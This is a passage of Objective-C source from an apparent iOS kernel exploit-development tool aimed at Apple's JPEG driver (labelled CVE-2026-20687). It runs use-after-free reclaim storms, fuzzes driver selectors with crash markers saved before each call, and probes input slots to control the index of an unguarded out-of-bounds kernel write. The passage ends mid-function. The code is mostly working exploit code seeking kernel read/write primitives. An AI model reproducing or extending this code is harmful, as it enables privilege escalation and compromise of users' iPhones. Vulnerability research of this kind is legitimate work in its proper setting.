            AveLog(@"[jpegclose] no timeout return: the sync did not reach the 10s wait");
    }

    // ---- Phase 5: second reclaim storm (appends to the open connections) ----
    const int RTHREADS = 8, RREQS = 5;
    AveLog(S(@"[jpegclose] reclaim storm start threads=%d reqs=%d", RTHREADS, RREQS));
    dispatch_group_t rg = dispatch_group_create();
    for (int t = 0; t < RTHREADS; t++) {
        dispatch_group_async(rg, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            io_connect_t c = 0;
            kern_return_t opr = IOServiceOpen(svc, mach_task_self(), 0, &c);
            if (opr != KERN_SUCCESS || !c) {
                AveLog(S(@"[jpegclose] reclaim[%d] open kr=%#x", t, opr));
                return;
            }
            int n = rs_jc_submit(c, srcID, dstID, W, H, RREQS,
                                 0x71710000 + (t << 8), 0, (uint32_t)(t & 3), 1);
            int idx = __sync_fetch_and_add(&rs_jc_rcount, 1);
            if (idx < RS_JC_MAXRECLAIM) rs_jc_reclaim[idx] = c;
            AveLog(S(@"[jpegclose] reclaim[%d] submitted=%d", t, n));
        });
    }
    dispatch_group_wait(rg, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
    AveLog(S(@"[jpegclose] reclaim storm done conns=%d", rs_jc_rcount));
    usleep(50000);

    // ---- Phase 6: probe while the reclaim requests are still in flight ----
    for (int round = 0; round < 3; round++) {
        io_connect_t probe = 0;
        kern_return_t por = IOServiceOpen(svc, mach_task_self(), 0, &probe);
        if (por != KERN_SUCCESS || !probe) { usleep(200000); continue; }
        CFTimeInterval dt = 0;
        kern_return_t pr = rs_jc_sync(probe, srcID, dstID, W, H, &dt);
        AveLog(S(@"[jpegclose] probe round=%d kr=%#x dt=%.3fs", round, pr, dt));
        IOServiceClose(probe);
        usleep(200000);
    }

    // ---- Phase 7: free ONE reclaimer at a time and probe after each.  If the
    //      stale node points into that connection's request, the next queue
    //      walk is a UAF on a slot WE chose. ----
    for (int i = 0; i < rs_jc_rcount && i < RS_JC_MAXRECLAIM; i++) {
        if (!rs_jc_reclaim[i]) continue;
        AveLog(S(@"[jpegclose] freeing reclaim[%d]", i));
        IOServiceClose(rs_jc_reclaim[i]);
        rs_jc_reclaim[i] = 0;
        usleep(100000);
        io_connect_t probe = 0;
        kern_return_t por = IOServiceOpen(svc, mach_task_self(), 0, &probe);
        if (por != KERN_SUCCESS || !probe) continue;
        CFTimeInterval dt = 0;
        kern_return_t pr = rs_jc_sync(probe, srcID, dstID, W, H, &dt);
        AveLog(S(@"[jpegclose] probe-after-free[%d] kr=%#x dt=%.3fs", i, pr, dt));
        IOServiceClose(probe);
        usleep(100000);
    }

    // ---- Phase 8: keep whatever is left alive while Camera is foregrounded
    //      (the driver's deferred completion path is the other trigger) ----
    UIBackgroundTaskIdentifier bg = [[UIApplication sharedApplication]
        beginBackgroundTaskWithName:@"jpegclose" expirationHandler:^{
            AveLog(@"[jpegclose] background task expired");
        }];
    AveLog(@"[jpegclose] phases done - OPEN CAMERA NOW and wait 15s (the other deferred path)");
    sleep(40);
    if (bg != UIBackgroundTaskInvalid)
        [[UIApplication sharedApplication] endBackgroundTask:bg];

    for (int i = 0; i < rs_jc_rcount && i < RS_JC_MAXRECLAIM; i++) {
        if (rs_jc_reclaim[i]) { IOServiceClose(rs_jc_reclaim[i]); rs_jc_reclaim[i] = 0; }
    }
    CFRelease(src); CFRelease(dst); IOObjectRelease(svc);
    AveSetStatus(@"jpegclose ladder done - see the log");
    return S(@"jpegclose: mass=%d/%d, reclaim conns=%d; look for kr=0xe00002d6 (controlled free) and a far=0x308 panic",
              sReq, sConn, rs_jc_rcount);
}

// ===========================================================================
// 4c. CVE-2026-20687 - AppleJPEGDriver SELECTOR AUDIT
//     Source: github.com/hidra0x/hidgate-poc experiments/applejpeg/jpegmethods2.m
//     + docs/applejpeg-methods.md.
//     Their AppleJPEGDriverUserClient dispatch table (IOUserClient2022):
//       sel0 getTarget (none)      sel1 decode   (0x58 / 0x58)
//       sel2 query    (none)       sel3 encode   (0x58 / 0x58)
//       sel4 unknown  (0x1000/0x1000)            sel5 unknown (0x1000/0x1000)
//       sel6 async decode (0xDA0/0xDA0, allowAsync=1)
//       sel7 async encode (0xDA0/0xDA0, allowAsync=1)
//       sel8/9 privileged (entitlement gate)
//     Why audit: the decode-UAF reclaim loop is stuck - their stale queue node
//     keeps pointing at freed poison (x5/x6=0xfeedface..., x12=0, far=0x308)
//     even after same-type storms.  So the next gate is a DIRECT read/write
//     primitive from another selector: the 0xDA0 and 0x1000 structs are large
//     enough to contain user pointers, async references, notification ports or
//     buffer descriptors, and "a user pointer that the driver dereferences or
//     writes in kernel context is a direct primitive".
//     This module replays their probe on OUR A14 / 26.2b1: every selector, every
//     kr, every outSize, the 0x58 decode header placed at offsets 0/0x10/0x58/
//     0x100 inside the big structs, and the driver's notification port drained
//     after each call (async completion messages may be the first kernel-side
//     data readable from userland).
//     Diagnostic only: it writes nothing and chains nothing.
// ===========================================================================
static void rs_jm_fill(RSJpegIn *in, uint32_t srcID, uint32_t dstID,
                       uint32_t w, uint32_t h, uint8_t flags, uint64_t token) {
    memset(in, 0, sizeof(*in));
    in->sourceID = srcID;
    in->field_04 = w * h;
    in->destID = dstID;
    in->field_0C = w * h * 4;
    in->width = w;
    in->height = h;
    in->outWidth = w;
    in->outHeight = h;
    in->subsampling = 3;
    in->flags = flags;
    in->asyncToken = token;
}

// Dump bytes as 64-bit words first (a kernel pointer or a leaked address shows
// up there immediately), then as hex.  This is the first kernel->userland data
// we have ever been able to read, so the content matters more than the kr.
// Set one 8-byte slot in a valid sel5 request and return the kr.  Used by the
// threshold probe to pin the accepted range of a field exactly.
static void rs_jm_dump(NSString *what, const uint8_t *p, size_t len);
static kern_return_t rs_jm_tryVal(io_connect_t conn, uint32_t slot, uint64_t val,
                                  uint32_t srcID, uint32_t dstID, uint32_t w, uint32_t h) {
    uint8_t *big = (uint8_t *)malloc(0x1000);
    uint8_t *bigo = (uint8_t *)malloc(0x1000);
    if (!big || !bigo) { free(big); free(bigo); return (kern_return_t)0x10000002; }
    memset(big, 0, 0x1000);
    memset(bigo, 0, 0x1000);
    rs_jm_fill((RSJpegIn *)big, srcID, dstID, w, h, 0, 0x6161);
    memcpy(big + slot, &val, 8);
    size_t os = 0x1000;
    kern_return_t kr = IOConnectCallStructMethod(conn, 5, big, 0x1000, bigo, &os);
    // If the driver echoes what we put in +0x58/+0x78 into the 4096-byte
    // output, that is a controlled read-back channel through the driver.
    if (kr == KERN_SUCCESS) {
        int echoed = 0;
        for (uint32_t k = 0; k < 0x1000; k++)
            if (bigo[k] != 0) { echoed = 1; break; }
        if (echoed) {
            AveLog(S(@"[jpegmethods]   *** SEL5 OUTPUT NON-ZERO for +%#x = %#llx ***",
                     slot, val));
            rs_jm_dump(S(@"sel5 out (+%#x=%#llx)", slot, val), bigo, 0x1000);
        }
    }
    free(big);
    free(bigo);
    return kr;
}

// Persist the selector we are about to call, so that after a kernel panic and
// reboot the app can report exactly which selector killed it.  Without this the
// log dies with the device and the triggering selector is unknowable.
static void rs_jm_markSel(uint32_t sel, int shape) {
    NSString *dir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                         NSUserDomainMask, YES) firstObject];
    if (!dir) return;
    NSString *path = [dir stringByAppendingPathComponent:@"lastsel.txt"];
    NSString *s = [NSString stringWithFormat:@"sel=%u shape=%d\n", sel, shape];
    @try {
        [s writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil];
    } @catch (NSException *e) {
    }
}

static NSString *rs_jm_lastSel(void) {
    NSString *dir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                         NSUserDomainMask, YES) firstObject];
    if (!dir) return nil;
    NSString *path = [dir stringByAppendingPathComponent:@"lastsel.txt"];
    if (![[NSFileManager defaultManager] fileExistsAtPath:path]) return nil;
    NSString *s = [NSString stringWithContentsOfFile:path encoding:NSUTF8StringEncoding error:nil];
    return s;
}

static void rs_jm_dump(NSString *what, const uint8_t *p, size_t len) {
    if (!p || len < 8) return;
    size_t n = len > 512 ? 512 : len;
    AveLog(S(@"%@ dump: %zu bytes (showing %zu)", what, len, n));
    for (size_t k = 0; k + 8 <= n; k += 8) {
        uint64_t w;
        memcpy(&w, p + k, 8);
        AveLog(S(@"%@  +%04zx = 0x%016llx", what, k, w));
    }
    NSMutableString *hex = [NSMutableString string];
    for (size_t k = 0; k < n; k++) {
        [hex appendFormat:@"%02x", p[k]];
        if ((k & 31) == 31) [hex appendString:@"\n"];
    }
    AveLog(S(@"%@ hex: %@", what, hex));
}

static void rs_jm_call(io_connect_t conn, uint32_t sel, const void *in, size_t inLen,
                       void *out, size_t outLen, NSString *label) {
    if (sel > 20) { AveLog(S(@"sel%u %@: invalid selector", sel, label)); return; }
    size_t os = outLen;
    kern_return_t kr = IOConnectCallStructMethod(conn, sel, in, inLen, out, &os);
    AveLog(S(@"sel%u %@ kr=%#x outSize=%zu", sel, label, kr, os));
    // a successful struct call that filled the output buffer is a candidate
    // read primitive - dump what the driver wrote back to userland
    if (kr == KERN_SUCCESS && out && os > 0)
        rs_jm_dump(S(@"sel%u out", sel), (const uint8_t *)out, os);
}

static void rs_jm_drain(mach_port_t port, NSString *label) {
    if (port == MACH_PORT_NULL) return;
    uint8_t msg[0x400];
    for (int i = 0; i < 4; i++) {
        mach_msg_header_t *h = (mach_msg_header_t *)msg;
        kern_return_t kr = mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                                    0, sizeof(msg), port, 10, MACH_PORT_NULL);
        if (kr != MACH_MSG_SUCCESS) break;
        AveLog(S(@"notify %@ id=%u size=%u bits=%#x remote=%#x local=%#x",
                 label, h->msgh_id, h->msgh_size, h->msgh_bits,
                 h->msgh_remote_port, h->msgh_local_port));
        if (h->msgh_size >= sizeof(mach_msg_header_t) && h->msgh_size <= sizeof(msg))
            rs_jm_dump(S(@"notify %@", label), (const uint8_t *)msg, h->msgh_size);
    }
}

// Read back the selector that was being attempted when the device last panicked.
// This makes NO driver calls at all, so it cannot panic - it just reports the
// marker the sweep writes before every call shape.
NSString *ModJpegLastPanic(void) {
    AveLog(@"[jpeglast] === last attempted selector before any kernel panic ===");
    NSString *last = rs_jm_lastSel();
    if (last && last.length > 0) {
        AveLog(S(@"[jpeglast] *** LAST ATTEMPTED: %@ ***", last));
        AveSetStatus(@"last panic selector shown - see the log");
        return S(@"last attempted selector before the panic: %@", last);
    }
    AveLog(@"[jpeglast] no marker file yet - no panic has been recorded");
    AveSetStatus(@"no panic marker yet");
    return @"no marker yet: run 20687 selectors first, then reboot and run this";
}

// Focused probe of the NEW selector the panic came from: sel=31 shape=3 (the
// 0xDA0 struct).  The public PoC only documented sel0-sel10 and the kext's
// dispatchers bound at 25, so sel26-31 is entirely uncharted.
//   Phase A (safe): sel26..31 with scalar-only, 0x58 and 0x1000, dumping every
//                   successful output.
//   Phase B: sel31 with a 0xDA0 struct in several variants, each recorded in the
//            panic marker BEFORE the call, so one run shows which variant dies.
NSString *ModJpegSel31(void) {
    AveLog(@"[sel31] === focused probe: sel26..31 + the 0xDA0 variants that panicked ===");
    io_service_t svc = rs_jpeg_service();
    if (!svc) return @"AppleJPEGDriver: service not found";

    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    if (kr != KERN_SUCCESS || !conn) { IOObjectRelease(svc); return @"userclient not openable"; }

    mach_port_t notify = MACH_PORT_NULL;
    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notify) == KERN_SUCCESS)
        mach_port_insert_right(mach_task_self(), notify, notify, MACH_MSG_TYPE_MAKE_SEND);
    IOConnectSetNotificationPort(conn, 0, notify, 0);

    const uint32_t W = 2048, H = 2048;
    UIGraphicsBeginImageContext(CGSizeMake(W, H));
    [[UIColor redColor] setFill];
    UIRectFill(CGRectMake(0, 0, W, H));
    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    NSData *jpeg = UIImageJPEGRepresentation(img, 0.9);
    size_t allocLen = jpeg ? ((jpeg.length + 0x3FFF) & ~(size_t)0x3FFF) : 0x1000;
    NSDictionary *sp = @{(id)kIOSurfaceWidth: @(allocLen), (id)kIOSurfaceHeight: @1,
                         (id)kIOSurfaceBytesPerElement: @1, (id)kIOSurfacePixelFormat: @0x20202020};
    IOSurfaceRef_ src = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
    NSDictionary *dp = @{(id)kIOSurfaceWidth: @(W), (id)kIOSurfaceHeight: @(H),
                         (id)kIOSurfaceBytesPerElement: @4, (id)kIOSurfacePixelFormat: @0x42475241};
    IOSurfaceRef_ dst = IOSurfaceCreate((__bridge CFDictionaryRef)dp);
    if (!jpeg || !src || !dst) {
        if (src) CFRelease(src);
        if (dst) CFRelease(dst);
        IOServiceClose(conn); IOObjectRelease(svc);
        return @"surface/jpeg setup failed";
    }
    IOSurfaceLock(src, 0, NULL);
    memcpy(IOSurfaceGetBaseAddress(src), jpeg.bytes, jpeg.length);
    IOSurfaceUnlock(src, 0, NULL);
    uint32_t srcID = IOSurfaceGetID(src), dstID = IOSurfaceGetID(dst);
    AveLog(S(@"[sel31] src=%u dst=%u jpeg=%zuB", srcID, dstID, jpeg.length));

    // ---- Phase A: sel26..31, the three shapes that did NOT panic ----
    AveLog(@"[sel31] --- phase A: sel26..31, scalar / 0x58 / 0x1000 ---");
    for (uint32_t sel = 26; sel <= 31; sel++) {
        uint64_t sc[6] = {1, 2, 3, 4, 5, 6};
        uint64_t oc64[8];
        uint32_t oc = 8;
        memset(oc64, 0, sizeof oc64);
        rs_jm_markSel(sel, 0);
        kern_return_t kA = IOConnectCallMethod(conn, sel, sc, 6, NULL, 0, oc64, &oc, NULL, NULL);
        AveLog(S(@"sel%-2u scalar   kr=%#x outCnt=%u", sel, kA, oc));

        RSJpegIn b1;
        RSJpegIn b2;
        memset(&b1, 0, sizeof b1);
        memset(&b2, 0, sizeof b2);
        rs_jm_fill(&b1, srcID, dstID, W, H, 0, 0x6161);
        size_t osz = sizeof b2;
        rs_jm_markSel(sel, 1);
        kern_return_t kB = IOConnectCallStructMethod(conn, sel, &b1, sizeof b1, &b2, &osz);
        AveLog(S(@"sel%-2u 0x58     kr=%#x outSize=%zu", sel, kB, osz));
        if (kB == KERN_SUCCESS && osz > 0)
            rs_jm_dump(S(@"sel%u 0x58 out", sel), (const uint8_t *)&b2, osz);

        uint8_t *c1 = (uint8_t *)malloc(0x1000);
        uint8_t *c2 = (uint8_t *)malloc(0x1000);
        if (c1 && c2) {
            memset(c1, 0, 0x1000);
            memset(c2, 0, 0x1000);
            rs_jm_fill((RSJpegIn *)c1, srcID, dstID, W, H, 0, 0x6161);
            osz = 0x1000;
            rs_jm_markSel(sel, 2);
            kern_return_t kC = IOConnectCallStructMethod(conn, sel, c1, 0x1000, c2, &osz);
            AveLog(S(@"sel%-2u 0x1000   kr=%#x outSize=%zu", sel, kC, osz));
            if (kC == KERN_SUCCESS && osz > 0)
                rs_jm_dump(S(@"sel%u 0x1000 out", sel), c2, osz);
        }
        free(c1);
        free(c2);
        rs_jm_drain(notify, S(@"sel%u", sel));
    }
    AveLog(@"[sel31] --- phase A done (no panic) ---");

    // ---- Phase B: sel31 with a 0xDA0 struct, one variant at a time ----
    // Each variant is recorded in the marker before the call, so after a panic
    // and reboot the marker names the variant that died.
    AveLog(@"[sel31] --- phase B: sel31 0xDA0 variants ---");
    for (int v = 0; v < 6; v++) {
        uint8_t *d1 = (uint8_t *)malloc(0xDA0);
        uint8_t *d2 = (uint8_t *)malloc(0xDA0);
        if (!d1 || !d2) { free(d1); free(d2); break; }
        memset(d1, 0, 0xDA0);
        memset(d2, 0, 0xDA0);
        switch (v) {
            case 0:   // completely zero - no header at all
                AveLog(@"[sel31] variant 0: all-zero 0xDA0 (no header)");
                break;
            case 1:   // the sweep's shape: valid header + zeros  (KNOWN PANIC)
                rs_jm_fill((RSJpegIn *)d1, srcID, dstID, W, H, 0, 0x6161);
                AveLog(@"[sel31] variant 1: valid 0x58 header, asyncToken=0x6161 (the known panic)");
                break;
            case 2:   // same but asyncToken = 0 (sync)
                rs_jm_fill((RSJpegIn *)d1, srcID, dstID, W, H, 0, 0);
                AveLog(@"[sel31] variant 2: valid header, asyncToken=0 (sync)");
                break;
            case 3:   // same but flags = 1
                rs_jm_fill((RSJpegIn *)d1, srcID, dstID, W, H, 1, 0x6161);
                AveLog(@"[sel31] variant 3: valid header, flags=1");
                break;
            case 4:   // 64x64 header - tiny surfaces
                rs_jm_fill((RSJpegIn *)d1, srcID, dstID, 64, 64, 0, 0x6161);
                AveLog(@"[sel31] variant 4: 64x64 header");
                break;
            case 5:   // header at offset 0x58 instead of 0
                rs_jm_fill((RSJpegIn *)(d1 + 0x58), srcID, dstID, W, H, 0, 0x6161);
                AveLog(@"[sel31] variant 5: header at +0x58");
                break;
            default:
                break;
        }
        size_t osz = 0xDA0;
        rs_jm_markSel(31, 100 + v);
        kern_return_t kD = IOConnectCallStructMethod(conn, 31, d1, 0xDA0, d2, &osz);
        AveLog(S(@"[sel31] variant %d 0xDA0 -> kr=%#x outSize=%zu", v, kD, osz));
        if (kD == KERN_SUCCESS && osz > 0)
            rs_jm_dump(S(@"sel31 var%d out", v), d2, osz);
        free(d1);
        free(d2);
        rs_jm_drain(notify, S(@"sel31 var%d", v));
    }

    IOServiceClose(conn);
    CFRelease(src); CFRelease(dst);
    IOObjectRelease(svc);
    AveSetStatus(@"sel31 probe done - see the log");
    return @"sel31 probe done: phase A (sel26..31, three shapes) + phase B (six 0xDA0 variants)";
}

// Cumulative sweep-range probe.  The focused sel31 probe produced NO panic, so
// sel31 alone is not the cause - the panic needs state created by earlier calls
// in the full sweep.  These modules run a PREFIX of the sweep (sel lo..hi, four
// call shapes, marker written before every call) so the bisect is: run 0-7, then
// 0-15, then 0-23; the first prefix that panics names the selector that creates
// the object whose obj+0x54 (loop count) and obj+0x78 (bound, a copy of
// obj+0x36c) disagree.
static NSString *ModJpegSweepRange(int lo, int hi) {
    AveLog(S(@"[sweep] === cumulative sweep sel%d..%d (four shapes) ===", lo, hi));
    io_service_t svc = rs_jpeg_service();
    if (!svc) return @"AppleJPEGDriver: service not found";

    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    if (kr != KERN_SUCCESS || !conn) { IOObjectRelease(svc); return @"userclient not openable"; }

    mach_port_t notify = MACH_PORT_NULL;
    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notify) == KERN_SUCCESS)
        mach_port_insert_right(mach_task_self(), notify, notify, MACH_MSG_TYPE_MAKE_SEND);
    IOConnectSetNotificationPort(conn, 0, notify, 0);

    const uint32_t W = 2048, H = 2048;
    UIGraphicsBeginImageContext(CGSizeMake(W, H));
    [[UIColor redColor] setFill];
    UIRectFill(CGRectMake(0, 0, W, H));
    [[UIColor blueColor] setFill];
    UIRectFill(CGRectMake(0, 0, W / 2, H / 2));
    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    NSData *jpeg = UIImageJPEGRepresentation(img, 0.9);
    size_t allocLen = jpeg ? ((jpeg.length + 0x3FFF) & ~(size_t)0x3FFF) : 0x1000;
    NSDictionary *sp = @{(id)kIOSurfaceWidth: @(allocLen), (id)kIOSurfaceHeight: @1,
                         (id)kIOSurfaceBytesPerElement: @1, (id)kIOSurfacePixelFormat: @0x20202020};
    IOSurfaceRef_ src = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
    NSDictionary *dp = @{(id)kIOSurfaceWidth: @(W), (id)kIOSurfaceHeight: @(H),
                         (id)kIOSurfaceBytesPerElement: @4, (id)kIOSurfacePixelFormat: @0x42475241};
    IOSurfaceRef_ dst = IOSurfaceCreate((__bridge CFDictionaryRef)dp);
    if (!jpeg || !src || !dst) {
        if (src) CFRelease(src);
        if (dst) CFRelease(dst);
        IOServiceClose(conn); IOObjectRelease(svc);
        return @"surface/jpeg setup failed";
    }
    IOSurfaceLock(src, 0, NULL);
    memcpy(IOSurfaceGetBaseAddress(src), jpeg.bytes, jpeg.length);
    IOSurfaceUnlock(src, 0, NULL);
    uint32_t srcID = IOSurfaceGetID(src), dstID = IOSurfaceGetID(dst);
    AveLog(S(@"[sweep] sel%d..%d src=%u dst=%u jpeg=%zuB", lo, hi, srcID, dstID, jpeg.length));

    int calls = 0;
    for (int sel = lo; sel <= hi; sel++) {
        uint64_t sc[6] = {1, 2, 3, 4, 5, 6};
        uint64_t oc64[8];
        uint32_t oc = 8;
        memset(oc64, 0, sizeof oc64);
        rs_jm_markSel(sel, 0);
        kern_return_t kA = IOConnectCallMethod(conn, sel, sc, 6, NULL, 0, oc64, &oc, NULL, NULL);
        AveLog(S(@"sel%-2d scalar  kr=%#x outCnt=%u", sel, kA, oc));
        calls++;

        RSJpegIn b1;
        RSJpegIn b2;
        memset(&b1, 0, sizeof b1);
        memset(&b2, 0, sizeof b2);
        rs_jm_fill(&b1, srcID, dstID, W, H, 0, 0x6161);
        size_t osz = sizeof b2;
        rs_jm_markSel(sel, 1);
        kern_return_t kB = IOConnectCallStructMethod(conn, sel, &b1, sizeof b1, &b2, &osz);
        AveLog(S(@"sel%-2d 0x58    kr=%#x outSize=%zu", sel, kB, osz));
        calls++;

        uint8_t *c1 = (uint8_t *)malloc(0x1000);
        uint8_t *c2 = (uint8_t *)malloc(0x1000);
        if (c1 && c2) {
            memset(c1, 0, 0x1000);
            memset(c2, 0, 0x1000);
            rs_jm_fill((RSJpegIn *)c1, srcID, dstID, W, H, 0, 0x6161);
            osz = 0x1000;
            rs_jm_markSel(sel, 2);
            kern_return_t kC = IOConnectCallStructMethod(conn, sel, c1, 0x1000, c2, &osz);
            AveLog(S(@"sel%-2d 0x1000  kr=%#x outSize=%zu", sel, kC, osz));
            if (kC == KERN_SUCCESS && osz > 0)
                rs_jm_dump(S(@"sel%u 0x1000 out", sel), c2, osz);
            calls++;
        }
        free(c1);
        free(c2);

        uint8_t *d1 = (uint8_t *)malloc(0xDA0);
        uint8_t *d2 = (uint8_t *)malloc(0xDA0);
        if (d1 && d2) {
            memset(d1, 0, 0xDA0);
            memset(d2, 0, 0xDA0);
            rs_jm_fill((RSJpegIn *)d1, srcID, dstID, W, H, 0, 0x6161);
            osz = 0xDA0;
            rs_jm_markSel(sel, 3);
            kern_return_t kD = IOConnectCallStructMethod(conn, sel, d1, 0xDA0, d2, &osz);
            AveLog(S(@"sel%-2d 0xDA0   kr=%#x outSize=%zu", sel, kD, osz));
            if (kD == KERN_SUCCESS && osz > 0)
                rs_jm_dump(S(@"sel%u 0xDA0 out", sel), d2, osz);
            calls++;
        }
        free(d1);
        free(d2);

        rs_jm_drain(notify, S(@"sel%d", sel));
    }

    IOServiceClose(conn);
    CFRelease(src); CFRelease(dst);
    IOObjectRelease(svc);
    AveSetStatus(@"sweep range done - no panic");
    return S(@"sweep sel%d..%d done: %d calls, NO PANIC", lo, hi, calls);
}

NSString *ModJpegSweep07(void)  { return ModJpegSweepRange(0, 7); }
NSString *ModJpegSweep015(void) { return ModJpegSweepRange(0, 15); }
NSString *ModJpegSweep023(void) { return ModJpegSweepRange(0, 23); }

// Empirical test of the primitive candidate.  The only UNGUARDED indexed write
// in the kext is `str w22, [x9, w15, uxtw]` at kext+0x174c, and its index
// obj+0xcc is a verbatim copy of x1+0x178 (an unvalidated 14-word bulk copy at
// kext+0x24ff0).  We cannot statically resolve x1, so test it empirically: if
// x1 is our input struct, then slot +0x178 must be SETTABLE.  Probe slots
// +0x150..+0x190 of the 0x1000 struct, one at a time, for every selector, and
// report which slots the driver accepts (kr != 0xe00002c2).  An accepted +0x178
// means we control the index of an unguarded kernel write.
NSString *ModJpegIdxProbe(void) {
    AveLog(@"[idxprobe] === which 0x1000 slots does each selector accept? (hunting +0x178) ===");
    io_service_t svc = rs_jpeg_service();
    if (!svc) return @"AppleJPEGDriver: service not found";

    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    if (kr != KERN_SUCCESS || !conn) { IOObjectRelease(svc); return @"userclient not openable"; }

    mach_port_t notify = MACH_PORT_NULL;
    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notify) == KERN_SUCCESS)
        mach_port_insert_right(mach_task_self(), notify, notify, MACH_MSG_TYPE_MAKE_SEND);
    IOConnectSetNotificationPort(conn, 0, notify, 0);

    const uint32_t W = 2048, H = 2048;
    UIGraphicsBeginImageContext(CGSizeMake(W, H));
    [[UIColor redColor] setFill];
    UIRectFill(CGRectMake(0, 0, W, H));
    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    NSData *jpeg = UIImageJPEGRepresentation(img, 0.9);
    size_t allocLen = jpeg ? ((jpeg.length + 0x3FFF) & ~(size_t)0x3FFF) : 0x1000;
    NSDictionary *sp = @{(id)kIOSurfaceWidth: @(allocLen), (id)kIOSurfaceHeight: @1,
                         (id)kIOSurfaceBytesPerElement: @1, (id)kIOSurfacePixelFormat: @0x20202020};
    IOSurfaceRef_ src = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
    NSDictionary *dp = @{(id)kIOSurfaceWidth: @(W), (id)kIOSurfaceHeight: @(H),
                         (id)kIOSurfaceBytesPerElement: @4, (id)kIOSurfacePixelFormat: @0x42475241};
    IOSurfaceRef_ dst = IOSurfaceCreate((__bridge CFDictionaryRef)dp);
    if (!jpeg || !src || !dst) {
        if (src) CFRelease(src);
        if (dst) CFRelease(dst);
        IOServiceClose(conn); IOObjectRelease(svc);
        return @"surface/jpeg setup failed";
    }
    IOSurfaceLock(src, 0, NULL);
    memcpy(IOSurfaceGetBaseAddress(src), jpeg.bytes, jpeg.length);
    IOSurfaceUnlock(src, 0, NULL);
    uint32_t srcID = IOSurfaceGetID(src), dstID = IOSurfaceGetID(dst);

    // The bulk copy maps x1+0x158..0x180 -> obj+0xac..0xd4.  Probe that whole
    // window plus a little either side.
    const uint32_t LO = 0x148, HI = 0x188;
    int accepted = 0;
    for (uint32_t sel = 0; sel < 32; sel++) {
        for (uint32_t slot = LO; slot < HI; slot += 4) {
            uint8_t *big = (uint8_t *)malloc(0x1000);
            uint8_t *bigo = (uint8_t *)malloc(0x1000);
            if (!big || !bigo) { free(big); free(bigo); break; }
            memset(big, 0, 0x1000);
            memset(bigo, 0, 0x1000);
            rs_jm_fill((RSJpegIn *)big, srcID, dstID, W, H, 0, 0x6161);
            uint32_t canary = 0xC0FF0000u | slot;
            memcpy(big + slot, &canary, 4);
            size_t osz = 0x1000;
            rs_jm_markSel(sel, 200 + (slot - LO));
            kern_return_t k = IOConnectCallStructMethod(conn, sel, big, 0x1000, bigo, &osz);
            if (k != (kern_return_t)0xe00002c2) {
                accepted++;
                AveLog(S(@"[idxprobe] ACCEPTED sel%u slot +%#x -> kr=%#x outSize=%zu",
                         sel, slot, k, osz));
                if (k == KERN_SUCCESS && osz > 0)
                    rs_jm_dump(S(@"sel%u +%#x out", sel, slot), bigo, osz);
            }
            free(big);
            free(bigo);
        }
        rs_jm_drain(notify, S(@"sel%u", sel));
    }

    IOServiceClose(conn);
    CFRelease(src); CFRelease(dst);
    IOObjectRelease(svc);
    AveSetStatus(@"index probe done - see the log");
    return S(@"index probe done: %d accepted (slot, selector) pairs in +%#x..+%#x",
              accepted, LO, HI);
}

// The decisive experiment for the primitive candidate.
//
// Established facts:
//   * the ONLY unguarded indexed write in the kext is
//       kext+0x174c   str  w22, [x9, w15, uxtw]
//     with w15 = obj->0xcc;
//   * obj+0xcc is a verbatim copy of x1+0x178 (an unvalidated 14-word bulk copy
//     at kext+0x24ff0 that maps x1+0x158..0x180 -> obj+0xac..0xd4);
//   * the index probe just PROVED that slots +0x148..+0x188 of the 0x1000 input
//     struct are all accepted by sel5 with kr=0 - including +0x178 itself.
//
// So: set +0x178 (and the whole copy window) to controlled values and look for
// an effect.  A large index must either (a) land in the 4096-byte output as a
// read-back echo, or (b) crash with a computed fault address = an out-of-bounds
// write.  Each variant is written to the panic marker BEFORE the call.
NSString *ModJpegIdxWrite(void) {
    AveLog(@"[idxwrite] === does +0x178 (the index of the unguarded write) do anything? ===");
    io_service_t svc = rs_jpeg_service();
    if (!svc) return @"AppleJPEGDriver: service not found";

    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    if (kr != KERN_SUCCESS || !conn) { IOObjectRelease(svc); return @"userclient not openable"; }

    mach_port_t notify = MACH_PORT_NULL;
    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notify) == KERN_SUCCESS)
        mach_port_insert_right(mach_task_self(), notify, notify, MACH_MSG_TYPE_MAKE_SEND);
    IOConnectSetNotificationPort(conn, 0, notify, 0);

    const uint32_t W = 2048, H = 2048;
    UIGraphicsBeginImageContext(CGSizeMake(W, H));
    [[UIColor redColor] setFill];
    UIRectFill(CGRectMake(0, 0, W, H));
    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    NSData *jpeg = UIImageJPEGRepresentation(img, 0.9);
    size_t allocLen = jpeg ? ((jpeg.length + 0x3FFF) & ~(size_t)0x3FFF) : 0x1000;
    NSDictionary *sp = @{(id)kIOSurfaceWidth: @(allocLen), (id)kIOSurfaceHeight: @1,
                         (id)kIOSurfaceBytesPerElement: @1, (id)kIOSurfacePixelFormat: @0x20202020};
    IOSurfaceRef_ src = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
